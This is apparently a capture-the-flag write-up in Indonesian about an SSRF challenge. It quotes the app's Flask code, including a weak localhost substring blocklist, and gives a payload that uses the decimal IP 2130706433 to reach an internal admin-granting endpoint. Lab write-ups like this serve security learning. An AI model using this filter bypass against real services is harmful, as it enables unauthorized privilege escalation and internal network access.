---
title: WEBX CAFFEINE SSRF
date: 2026-06-06
tags:
  - SSRF
  - WEBX
  - SOAL_MAS_D
---
# WEBX CAFFEINE SSRF

Kamu akan di beri sebuah web yang berisi

login page

![image.png](WEBX%20CAFFEINE%20SSRF/image.png)

Register pageucup

![image.png](WEBX%20CAFFEINE%20SSRF/image%201.png)

Setelah kalian register akun dan login kalian masuk di halaman home. Lalu ada sebuah fitur untuk membuat produk baru 

![image.png](WEBX%20CAFFEINE%20SSRF/image%202.png)

Recon dari source code:

```python
@web.route('/home', methods=['GET'])
@isAuthenticated
def homeView(user):
    return render_template('index.html', user=user, flag=current_app.config['FLAG'])
```

aku langsung lihat route dan mencari dimana flag muncul, nah ternyata itu di local host tapi kok gak muncul terus aku cek di index.html nah ternyata 

```html
					{% if user['role'] == 'admin' %}
						{{flag}}
					{% endif %}
```

flag ya muncul kalo admin doang

terus aku check cara jadi admin 

```python
@service.route('/administratorAdd', methods=['GET'])
@isFromLocalhost
def administratorAdd():
    username = request.args.get('username')
    
    if not username:
        return response('Invalid username'), 400
    
    result = addAdmin(username)

    if result:
        return response('User updated!')
    return response('Invalid username'), 400
```

Ternyata kalau kita pake url [localhost](http://localhost) dan memasukan username kita kita bisa jadi admin nah tapi cara kita maka rencana ini gimana 

```python
@service.route('/product', methods=['POST'])
@isAuthenticated
def sellProduct(user):
    if not request.is_json:
        return response('Invalid JSON!'), 400

    data = request.get_json()
    name = data.get('name', '')
    price = data.get('price', '')
    description = data.get('description', '')
    manualUrl = data.get('manual', '')

    if not name or not price or not description or not manualUrl:
        return response('Isi semua formulir'), 401

    manualPath = downloadManual(manualUrl)
    if (manualPath):
        addProduct(name, description, price)
        return response('Produk tersubmit. Silahkan menunggu verifikasi administrator kami')
    return response('URL Tidak Valid!'), 400
```

kita bisa exploit dengan ssrf di manual nya 

lalu ku check func downloadManual nya dan ternyata

```python
def downloadManual(url):
    safeUrl = isSafeUrl(url)
    if safeUrl:
        try:
            local_filename = url.split("/")[-1]
            r = requests.get(url)
            
            with open(f"/opt/manualFiles/{local_filename}", "wb") as f:
                for chunk in r.iter_content(chunk_size=1024):
                    if chunk:
                        f.write(chunk)
            return True
        except:
            return False
    
    return False
```

ada sanitasi isSafeUrl

```python
def isSafeUrl(url):
    for hosts in blocked_host:
        if hosts in url:
            return False
    
    return True
    
```

    *blocked_host* *=* ["127.0.0.1", "localhost", "0.0.0.0"]

dan ya kita gak bisa kalo ssrf langsung dengan url [localhost](http://localhost) yang di block tapi kita bisa pake format ini [http://2130706433/](http://127.0.0.1/)

yaudah langsung saja kita edit burp aja biar gampang debug 

payload = [http://2130706433:8099/service/administratorAdd?username=ucup](http://127.0.0.1:8099/service/administratorAdd?username=ucup)

![image.png](WEBX%20CAFFEINE%20SSRF/image%203.png)